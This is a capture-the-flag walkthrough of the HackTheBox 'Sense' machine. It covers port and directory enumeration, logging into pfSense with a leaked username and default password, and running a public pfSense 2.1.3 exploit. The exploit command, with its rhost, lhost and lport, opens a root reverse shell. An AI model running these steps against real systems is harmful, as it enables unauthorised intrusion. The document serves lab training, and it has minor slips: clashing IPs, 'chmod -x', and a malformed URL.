@@ -1,0 +1,64 @@
+    • First, I set up /etc/hosts to point 10.10.10.16 to sense.htb
+    • This does not ping, we will try to nmap this with the -Pn switch
+        ◦ nmap -Pn sense.htb
+            ▪ This confirmed the host is up, scanned the top 5000 ports
+        ◦ nmap -Pn -p 1-5000 sense.htb
+            ▪ 80/tcp http
+            ▪ 443/tcp https
+    • Going in to a regular web browser, I am unable to get this to load via http or https
+    • Next, I did a quick dirsearch via the dirsearch command to see if anything comes up
+        ◦ dirsearch -u https://sense.htb/
+        ◦ we get quite a few results to try out
+        ◦ /changelog.txt
+        ◦ /edit.php 
+        ◦ /favicon.ico
+        ◦ /index.php
+        ◦ /index.html
+        ◦ /system-users.txt
+        ◦ /index.php/login/
+        ◦ /license.php
+        ◦ /status.php                                       
+        ◦ /system.php
+        ◦ /xmlrpc.php
+    • https://sense.htb/changelog.txt has some interesting information.
+# Security Changelog 
+
+### Issue
+There was a failure in updating the firewall. Manual patching is therefore required
+
+### Mitigated
+2 of 3 vulnerabilities have been patched.
+
+### Timeline
+The remaining patches will be installed during the next maintenance window
+    • So there is likely a service on here somewhere that is not patched yet, we’ll keep an eye out for one.
+    • Edit.php says the info below
+        ◦ Potential DNS Rebind attack detected, see http://en.wikipedia.org/wiki/DNS_rebinding
+Try accessing the router by IP address instead of by hostname. 
+    • Nothing interesting with the favicon.
+    • All the rest of the subdirectories have the same thing
+    • attempting via IP address
+    • https://10.10.10.60:index.php gives us a log in screen
+    • This seems to be a pfsense login screen, which is a free and open-sourced firewall operating system
+    • I tried the default administrator credentials and this failed
+    • Thinking back to the note in changelog.txt, maybe there is an un-patched version of software being used here
+    • Using a tool called Wappalyzer, or the nmap -sV tag, we see that it is running lighttpd 1.4.35
+    • A couple Google searches later, I see there is a Critical vulnerability associated with this version labeled CVE-2014-2324, definitely in need of a patch
+    • I also looked at /system-users.txt
+        ◦ There is a support ticket compared here in .txt format
+        ◦ username: Rohit
+        ◦ password: company defaults
+    • We may be able to sign in this way, I don’t obviously know the company defaults however
+    • turns out, the default password, pfsense works for this user!
+    • We now find this is running pfsense 2.1.3
+    • I looked up pfsense 2.1.3 vulnerabilities and exploits
+        ◦ I found something from exploit database at https://www.exploit-db.com/exploits/43560
+        ◦ This seems to leverage the status_rrd_graph_img.php being vulnerable
+        ◦ It claims to be able to return an administrative shell
+    • I downloaded the exploit and added the chmod -x so I can run it later on
+    • First, I need to change the arguments in the beginning of the program
+    • python 43560.py --rhost 10.10.10.60 --lhost 10.10.14.2 --lport 1234 --username Rohit --password pfsense
+    • I get an error running the exploit
+    • I capitalized the username, now I’m in
+    • we are in as root
+    • from here, we can now enumerate the file system as root and cat out both the user and root flags
